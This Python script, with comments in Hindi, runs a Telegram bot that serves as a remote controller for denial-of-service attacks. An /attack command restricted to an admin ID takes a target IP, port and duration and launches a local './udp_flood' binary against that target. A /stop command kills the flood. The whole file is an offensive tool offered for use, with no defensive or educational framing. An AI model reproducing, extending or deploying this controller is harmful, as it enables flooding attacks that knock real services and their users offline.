import telebot
import subprocess
import shlex
import os

API_TOKEN = 'YOUR_BOT_TOKEN' # यहाँ अपना टोकन डालें
ADMIN_ID = 123456789        # अपना Telegram ID यहाँ डालें
bot = telebot.TeleBot(API_TOKEN)
process = None

@bot.message_handler(commands=['attack'])
def start_attack(message):
    global process
    if message.from_user.id != ADMIN_ID:
        return

    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "Format: /attack <IP> <PORT> <TIME>")
        return

    ip, port, duration = args[1], args[2], args[3]
    bot.reply_to(message, f"🚀 Attack started on {ip}:{port} for {duration}s")

    try:
        # C बाइनरी को बैकग्राउंड में चलाता है
        cmd = f"./udp_flood {ip} {port} {duration}"
        process = subprocess.Popen(shlex.split(cmd))
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    global process
    if process and process.poll() is None:
        process.terminate() # प्रोसेस को बंद करता है
        bot.reply_to(message, "🛑 Attack Stopped.")
    else:
        bot.reply_to(message, "No active attack.")

bot.polling()